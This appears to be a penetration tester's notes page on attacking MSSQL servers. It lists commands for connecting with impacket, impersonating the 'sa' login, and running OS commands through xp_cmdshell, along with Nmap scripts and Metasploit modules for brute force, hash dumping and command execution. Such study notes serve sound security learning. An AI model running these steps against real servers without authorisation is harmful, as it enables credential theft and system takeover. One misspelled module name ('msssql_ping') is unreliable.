- Vulnerability: [SQL Injection](../../../Web%20Application%20Pentesting/Injection/SQL%20Injection.md)
- TCP 1433
- `xp_cmdshell` of `sa` user to execute os commands.
![](../../../img/Pasted%20image%2020260104115305.png)

(mssqlclient) connecting to mssql
```bash
impacket-mssqlclient.py <USER>:<PASS>@<IP/DOMAIN> -windows-auth
```
(mssql) Impersonating users
```mssql
select system_user;
execute as login = 'sa';
```
## Nmap
- Finding **information about MSSQL server**
```bash
nmap -p [port number] --script ms-sql-info [target]
```
- Finding more information using **ntlm** on MSSQL
```bash
nmap -p [port number] --script ms-sql-ntlm-info [target]
```
- MSSQL **brute force** using Nmap
```bash
nmap -p [port number] --script ms-sql-brute [target]
```
- MSSQL **null session accounts**
```bash
nmap -p [port number] --script ms-sql-empty-password [target]
```
- **Queries** on MSSQL server
```bash
nmap -p [port number] --script ms-sql-query [target]
```
- **Dumping hashes** MSSQL accounts
```bash
nmap -p [port number] --script ms-sql-dump-hashes [target]
```
- **Running commands** on MSSQL server
```bash
nmap -p [port number] --script ms-sql-xp-cmdshell [target]
```
## Metasploit
- Quick scan
```bash
auxiliary/scanner/mssql/msssql_ping
```
- **Brute forcing** MSSQL server
```bash
auxiliary/scanner/mssql/mssql_login
```
- **Enumerating** MSSQL server
```bash
auxiliary/scanner/mssql/mssql_enum
```
- Enumerating MSSQL **logins**
```bash
auxiliary/scanner/mssql/mssql_enum_sql_logins
```
- Executing **commands** on MSSQL server

```bash
auxiliary/scanner/mssql/mssql_exec
```
- Enumerating **domain accounts** on MSSQL server
```bash
auxiliary/scanner/mssql/mssql_enum_domain_accounts
```